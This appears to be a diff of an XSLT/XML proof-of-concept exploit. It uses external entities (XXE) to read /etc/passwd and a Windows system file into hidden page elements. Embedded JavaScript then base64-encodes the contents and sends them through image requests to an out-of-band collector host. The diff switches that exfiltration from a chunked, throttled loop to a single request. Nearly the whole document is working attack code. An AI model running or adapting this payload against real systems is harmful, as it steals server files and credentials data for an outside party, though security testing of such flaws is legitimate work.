@@ -1,4 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="?#"?>
 <!DOCTYPE xsl:stylesheet [
   <!ENTITY passwd_p        "file:///etc/passwd">
   <!ENTITY passwd_c SYSTEM "file:///etc/passwd">
@@ -9,13 +10,11 @@
   xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
   xmlns="http://www.w3.org/1999/xhtml">
 
-  <!-- Prevent a second XML declaration and force HTML output -->
-  <xsl:output method="html" omit-xml-declaration="yes" encoding="UTF-8"/>
+  <!-- Serialize as XML/XHTML and omit the XML declaration in the result.
+       This prevents a second prolog from appearing ahead of the content. -->
+  <xsl:output method="xml" omit-xml-declaration="yes" encoding="UTF-8"/>
 
   <xsl:template match="/">
-
-    <!-- DO NOT xsl:copy-of document('') — it can inject PIs/DTD before <html> -->
-
     <html>
       <head>
         <meta charset="utf-8"/>
@@ -28,7 +27,7 @@
       </head>
       <body>
 
-        <!-- Hidden entity expansion targets -->
+        <!-- Hidden entity expansion targets (XXE) -->
         <div style="display:none">
           <p class="&passwd_p;">&passwd_c;</p>
           <p class="&sysini_p;">&sysini_c;</p>
@@ -38,21 +37,18 @@
         <div id="r"></div>
 
         <script><![CDATA[
-          // ---------- utilities ----------
+          // ---- helpers ----
           function b64utf8(s){ return btoa(unescape(encodeURIComponent(s))); }
-          function chunk(s,n){ const a=[]; for(let i=0;i<s.length;i+=n) a.push(s.slice(i,i+n)); return a; }
-          const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-          // ---------- render proof (use textContent, not innerHTML) ----------
-          const r = document.querySelector('#r');
-
-          {
-            const lbl = document.createElement('div');
-            lbl.textContent = 'remote web url:';
-            r.appendChild(lbl);
+          // ---- render initial proof ----
+          const r = document.getElementById('r');
+          { // remote web url
+            const label = document.createElement('div');
+            label.textContent = 'remote web url:';
+            r.appendChild(label);
 
             const ta = document.createElement('textarea');
-            ta.style.height='1.5rem';
+            ta.style.height = '1.5rem';
             ta.textContent = location.href;
             r.appendChild(ta);
 
@@ -60,31 +56,39 @@
             r.appendChild(document.createElement('br'));
           }
 
-          let raw = '';
-          document.querySelectorAll('p').forEach(p => {
-            const path = p.className;
-            const data = p.textContent; // preserves raw text
+          // ---- collect file paths & contents from hidden <p> nodes ----
+          const ps = document.querySelectorAll('p');
 
-            // path
+          // If this prints 0, entities didn't expand; the transform isn't producing <p> nodes.
+          const countNote = document.createElement('div');
+          countNote.textContent = 'found <p> nodes: ' + ps.length;
+          r.appendChild(countNote);
+
+          let raw = '';
+          ps.forEach(p => {
+            const path = p.className;
+            const data = p.textContent; // textContent preserves raw text
+
+            // show path
             {
-              const lbl = document.createElement('div');
-              lbl.textContent = 'local file path:';
-              r.appendChild(lbl);
+              const label = document.createElement('div');
+              label.textContent = 'local file path:';
+              r.appendChild(label);
 
               const ta = document.createElement('textarea');
-              ta.style.height='1.5rem';
+              ta.style.height = '1.5rem';
               ta.textContent = path;
               r.appendChild(ta);
             }
 
-            // content
+            // show content
             {
-              const lbl = document.createElement('div');
-              lbl.textContent = 'local file content:';
-              r.appendChild(lbl);
+              const label = document.createElement('div');
+              label.textContent = 'local file content:';
+              r.appendChild(label);
 
               const ta = document.createElement('textarea');
-              ta.style.height='60rem';
+              ta.style.height = '60rem';
               ta.textContent = data;
               r.appendChild(ta);
 
@@ -95,24 +99,13 @@
             raw += 'PATH:' + path + '\n' + 'DATA:' + data + '\n\n';
           });
 
-          // ---------- exfil (query params, padded base64, throttled) ----------
-          const base  = 'https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/';
-          const b64   = b64utf8(raw);
-          const parts = chunk(b64, 350);
-
-          // start marker
-          (new Image()).src = base + '?start=1&n=' + parts.length;
-
-          (async () => {
-            for (let i = 0; i < parts.length; i++) {
-              const img = new Image();
-              img.src = base + '?i=' + i + '&n=' + parts.length + '&d=' + encodeURIComponent(parts[i]);
-              document.body.appendChild(img);
-              await sleep(80); // small pause improves reliability in headless
-            }
-            (new Image()).src = base + '?end=1&n=' + parts.length;
-            await sleep(1000); // give headless time to flush requests
-          })();
+          // ---- exfil (single hit; expand to chunked if needed) ----
+          if (ps.length > 0) {
+            const b64 = b64utf8(raw);
+            const img = new Image();
+            img.src = 'https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/?x=' + encodeURIComponent(b64);
+            document.body.appendChild(img);
+          }
         ]]></script>
 
       </body>
